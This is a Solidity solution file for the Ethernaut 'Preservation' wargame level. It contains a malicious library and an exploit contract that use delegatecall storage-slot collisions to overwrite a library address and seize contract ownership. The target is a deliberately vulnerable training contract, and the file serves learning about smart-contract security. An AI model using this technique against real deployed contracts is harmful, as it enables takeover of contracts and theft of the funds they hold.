// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Solution for https://ethernaut.openzeppelin.com/ challenge 16 (Preservation)

abstract contract PreservationInterface {
    function setFirstTime(uint256 _timeStamp) public virtual;
    function setSecondTime(uint256 _timeStamp) public virtual;
    function owner() public view virtual returns (address);
    function timeZone1Library() public view virtual returns (address);
}

contract MaliciousLibrary {
    // Storage layout must match Preservation for delegatecall to work correctly
    // Slot 0: timeZone1Library (will be overwritten)
    // Slot 1: timeZone2Library
    // Slot 2: owner (target of our attack)
    // Slot 3: storedTime
    
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function setTime(uint256 _time) public {
        // Cast the uint256 to address and write to slot 2 (owner)
        // This works because delegatecall uses Preservation's storage layout
        owner = address(uint160(_time));
    }
}

contract PreservationExploit {
    PreservationInterface public targetContract;
    MaliciousLibrary public maliciousLibrary;

    constructor(address _target) {
        targetContract = PreservationInterface(_target);
        maliciousLibrary = new MaliciousLibrary();
    }

    function exploit() public {
        // Step 1: Overwrite timeZone1Library with malicious library address
        // This works because LibraryContract.setTime writes to slot 0 (storedTime in library)
        // but in Preservation's context, slot 0 is timeZone1Library
        targetContract.setFirstTime(uint256(uint160(address(maliciousLibrary))));
        
        // Step 2: Now setFirstTime will call our malicious library
        // Our malicious library's setTime writes to slot 2 (owner)
        targetContract.setFirstTime(uint256(uint160(msg.sender)));
    }
}

